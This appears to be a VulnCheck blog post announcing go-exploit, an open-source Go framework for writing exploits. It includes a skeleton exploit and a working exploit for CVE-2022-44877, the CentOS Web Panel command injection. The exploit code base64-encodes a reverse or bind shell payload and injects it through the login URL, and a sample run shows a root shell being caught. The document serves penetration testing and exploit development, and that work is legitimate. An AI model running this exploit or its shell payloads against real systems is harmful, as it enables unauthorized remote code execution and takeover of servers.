---
title: "Introducing go-exploit - An Exploit Framework for Go - Blog - VulnCheck"
date: 2023-05-25T00:00:00.000Z
draft: false
type: posts
categories: 
- 
---
# Introducing go-exploit - An Exploit Framework for Go - Blog - VulnCheck

<br/>

<br/>
\\nVulnCheck is excited to announce the open-source release of our \[in-house exploit framework, \`go-exploit\`\](https://github.com/vulncheck-oss/go-exploit). Designed with simplicity and portability in mind, \`go-exploit\` empowers exploit developers to create compact, self-contained, and consistent exploits.\\n\\nMany proof-of-concept exploits rely on interpreted languages with complicated packaging systems. They implement wildly differing user interfaces, and have limited ability to be executed within a target network. Some exploits are integrated into massive frameworks that are burdened by years of features and dependencies which overwhelm developers and hinder the attacker's ability to deploy the exploits from unconventional locations.\\n\\nTo overcome these challenges, \`go-exploit\` offers a lightweight framework with minimal dependencies, written in \[Go\](https://go.dev/)—a language renowned for its portability and cross-compilation capabilities. The framework strikes a balance between simplicity for rapid proof-of-concept development and the inclusion of sophisticated built-in features for operational use.\\n\\n## Key Features and Capabilities\\n\\n1. \*\*Cross-Platform Portability:\*\* Developed in Go, \`go-exploit\` offers seamless cross-platform compatibility. Whether you need to execute the exploit on Windows, Linux, macOS, or an embedded system, the framework ensures consistent functionality across different operating systems, thanks to Go's ability to compile to native executables.\\n2. \*\*A Single Executable:\*\* Each exploit compiles down to a single native executable, free from external dependencies. Due to the design of the framework, unused (or unwanted) features are completely eliminated from the compiled binary.\\n3. \*\*Defined Exploitation Stages:\*\* \`go-exploit\` introduces a structured approach to exploitation with three distinct stages: target validation, version checking, and exploitation. This clear separation allows exploit developers to focus on specific aspects of the exploit development process, enhancing efficiency and code organization.\\n4. \*\*Consistent User Interface:\*\* The framework defines a flexible yet consistent user interface that abstracts away complexities, providing a streamlined experience for exploit developers and users.\\n5. \*\*Builtin Command and Control:\*\* \`go-exploit\` includes built-in logic for establishing connections to bind shells or accepting encrypted or unencrypted reverse shells.\\n6. \*\*Pre-defined Payloads:\*\* \`go-exploit\` comes with a collection of pre-created exploit payloads including traditional “lolbin” reverse shells and bind shells, as well as more complicated payloads like Java gadgets. \`go-exploit\` also contains all the infrastructure needed for exploiting JNDI LDAP issues (e.g. \[Log4Shell\](https://en.wikipedia.org/wiki/Log4Shell), \[CVE-2023-21839\](https://nvd.nist.gov/vuln/detail/CVE-2023-21839), etc).\\n\\n## Creating an Exploit with \`go-exploit\`\\n\\nDeveloping a new exploit using \`go-exploit\` is designed to be a straightforward and efficient process. At a high level, the exploit developer only needs to create four essential functions:\\n\\n1. \`main()\`: This function is responsible for configuring the exploit type and defining the supported command and control options.\\n2. \`ValidateTarget()\`: The purpose of this function is to validate that the target system meets the criteria of the intended victim.\\n3. \`CheckVersion()\`: This function is used to confirm that the target system is a susceptible host by checking its version or specific characteristics.\\n4. \`RunExploit()\`: In this function, the exploitation logic is implemented, enabling the actual exploitation of the target system.\\n\\nTo provide a starting point, a skeleton exploit follows the structure outlined below:\\n\\n\`\`\`go\\npackage main\\n\\nimport (\\n "github.com/vulncheck-oss/go-exploit"\\n "github.com/vulncheck-oss/go-exploit/c2"\\n "github.com/vulncheck-oss/go-exploit/config"\\n)\\n\\ntype MyExploit struct{}\\n\\nfunc (sploit MyExploit) ValidateTarget(conf \*config.Config) bool {\\n return false\\n}\\n\\nfunc (sploit MyExploit) CheckVersion(conf \*config.Config) exploit.VersionCheckType {\\n return exploit.NotImplemented\\n}\\n\\nfunc (sploit MyExploit) RunExploit(conf \*config.Config) bool {\\n return true\\n}\\n\\nfunc main() {\\n supportedC2 := \[\]c2.Impl{\\n c2.SimpleShellServer,\\n c2.SimpleShellClient,\\n }\\n conf := config.New(config.CodeExecution, supportedC2, "My Target", "CVE-2023-1270", 80)\\n\\n sploit := MyExploit{}\\n exploit.RunProgram(sploit, conf)\\n}\\n\`\`\`\\n\\nTo build the skeleton exploit, you'll need to create a \`go.mod\` and \`go.sum\` file for the project. This can be done using the \`go mod\` command. The following commands will download and validate the most recent version of \`go-exploit\` and create the necessary \`go.mod\` and \`go.sum\` files:\\n\\n\`\`\`sh\\ngo mod init github.com/username/example\\nGO111MODULE=on go mod tidy\\n\`\`\`\\n\\nTo compile the skeleton exploit, you can use a simple command like the one shown below:\\n\\n\`\`\`sh\\nGO111MODULE=on go build -o exploit ./main.go\\n\`\`\`\\n\\nRunning this command will compile the skeleton exploit, and the resulting executable will be named \`exploit\`. If you want to customize the output filename, you can change the value after the \`-o\` flag.\\n\\nNow that you have the instructions for setting up and compiling your \`go-exploit\` exploit, let's move on to a real example to further illustrate its usage.\\n\\n\\n## A \`go-exploit\` for CVE-2022-44877\\n\\nIn this section, we will examine an example exploit for \[CVE-2022-44877\](https://nvd.nist.gov/vuln/detail/CVE-2022-44877) (CentOS Web Panel). CVE-2022-44877 is a trivial unauthenticated and remote command injection vulnerability so it’s great as a simple example. Let's start with the exploit's \`main()\` function:\\n\\n\`\`\`go\\nfunc main() {\\n supportedC2 := \[\]c2.Impl{\\n c2.SSLShellServer,\\n c2.SimpleShellServer,\\n c2.SimpleShellClient,\\n }\\n conf := config.New(config.CodeExecution, supportedC2, "CentOS Web Panel", "CVE-2022-44877", 2031)\\n sploit := CWPInjection{}\\n exploit.RunProgram(sploit, conf)\\n}\\n\`\`\`\\n\\nThere are two important aspects in the \`main()\` function. First, the exploit informs the framework about the supported command and control variants. This particular exploit supports three variants:\\n\\n1. \`c2.SSLShellServer\` (default): An encrypted reverse shell.\\n2. \`c2.SimpleShellServer\`: An unencrypted reverse shell.\\n3. \`c2.SimpleShellClient\`: An unencrypted bind shell.\\n\\nAdditionally, the exploit specifies that it is a \`CodeExecution\` exploit, which means it will run code directly on the victim host. The exploit type affects the command line interface and determines which command and control options are supported. Refer to our documentation for information on other exploit types.\\n\\nFor this example, we will skip the \`ValidateTarget\` and \`CheckVersion\` functions (you can find their implementations in our \[GitHub examples\](https://github.com/vulncheck-oss/go-exploit/tree/main/examples/cve-2022-44877)), and instead, focus on the \`RunExploit\` function. It looks like this:\\n\\n\\n\`\`\`go\\nfunc (sploit CWPInjection) RunExploit(conf \*config.Config) bool {\\n generated, ok := generatePayload(conf)\\n if !ok {\\n return false\\n }\\n\\n loginAttempt := map\[string\]string{\\n "username": "%72%6f%6F%74", // root encoded\\n "password": random.RandLetters(8),\\n "commit": "Login",\\n }\\n target := protocol.GenerateURL(conf.Rhost, conf.Rport, conf.SSL, "/login/index.php")\\n output.PrintSuccess("Sending exploit to " + target)\\n\\n // t=1 ET bypass\\n resp, \_, ok := protocol.HTTPSendAndRecvURLEncoded("POST", target+"?t=1&login="+generated, loginAttempt)\\n if !ok {\\n return false\\n }\\n\\n if resp.StatusCode != 200 {\\n output.PrintfError("Received an unexpected HTTP status code: %d", resp.StatusCode)\\n\\n return false\\n }\\n output.PrintStatus("Done")\\n\\n return true\\n}\\n\`\`\`\\n\\nThe \`RunExploit\` function generates the required payload using the \`generatePayload\` function and then constructs the HTTP request that triggers the payload execution. Here's the implementation of \`generatePayload\`:\\n\\n\`\`\`go\\nfunc generatePayload(conf \*config.Config) (string, bool) {\\n generated := ""\\n\\n switch conf.C2Type {\\n case c2.SSLShellServer:\\n output.PrintfStatus("Sending an SSL reverse shell payload for port %s:%d", conf.Lhost, conf.Lport)\\n generated = payload.ReverseShellMknodOpenSSL(conf.Lhost, conf.Lport)\\n case c2.SimpleShellServer:\\n output.PrintfStatus("Sending a reverse shell payload for port %s:%d", conf.Lhost, conf.Lport)\\n generated = payload.ReverseShellBash(conf.Lhost, conf.Lport)\\n case c2.SimpleShellClient:\\n output.PrintfStatus("Sending a bind shell for port %d", conf.Bport)\\n generated = payload.BindShellMkfifoNetcat(conf.Bport)\\n default:\\n output.PrintError("Invalid payload")\\n\\n return "", false\\n }\\n\\n payload64 := b64.StdEncoding.EncodeToString(\[\]byte(generated))\\n generated = "\`echo${IFS}" + payload64 + "|base64${IFS}-d|/bin/sh\`"\\n\\n return generated, true\\n}\\n\`\`\`\\n\\nAbove, we can see the implementation of the payloads for the three supported command and control variants. In this example, each variant can utilize a predefined payload provided by the exploit framework.\\n\\nFinally, the exploit can be executed against the target. The output might look like this:\\n\\n\`\`\`sh\\nalbinolobster@mournland:~/go-exploit/examples/cve-2022-44877$ ./cve-2022-44877 -a -c -v -e -rhost 10.9.49.214 -lhost 10.9.49.186 -lport 1270\\n\[\*\] Validating the remote target is a CentOS Web Panel installation\\n\[+\] Target validation succeeded!\\n\[\*\] Running a version check on the remote target\\n\[-\] broken.jpg has been modified since April 3, 2022. This instance \*might\* be vulnerable.\\n\[\*\] The target \*might\* be a vulnerable version. Continuing.\\n\[\*\] Generating a TLS Certificate\\n\[\*\] Starting TLS listener on 10.9.49.186:1270\\n\[\*\] Sending an SSL reverse shell payload for port 10.9.49.186:1270\\n\[+\] Sending exploit to https://10.9.49.214:2031/login/index.php\\n\[+\] Caught new shell from 10.9.49.214:35868\\n\[\*\] Active shell from 10.9.49.214:35868\\n$ whoami\\nsh: no job control in this shell\\nsh-4.2# whoami\\nroot\\n$ pwd\\npwd\\n/tmp\\n$\\n\`\`\`\\n\\n## Conclusion \\n\\n\`go-exploit\` provides a simple and efficient way to develop sophisticated and portable exploits. While there are several other existing exploit frameworks available, none offer the same experience as \`go-exploit\`. If you are interested in contributing to \`go-exploit\` or have feedback on your own experience developing exploits, we would love to hear from you! Visit \[\`go-exploit\` on GitHub\](https://github.com/vulncheck-oss/go-exploit) to get involved.\\n\\n

#### [Source](https://vulncheck.com/blog/go-exploit)

<br/>
---
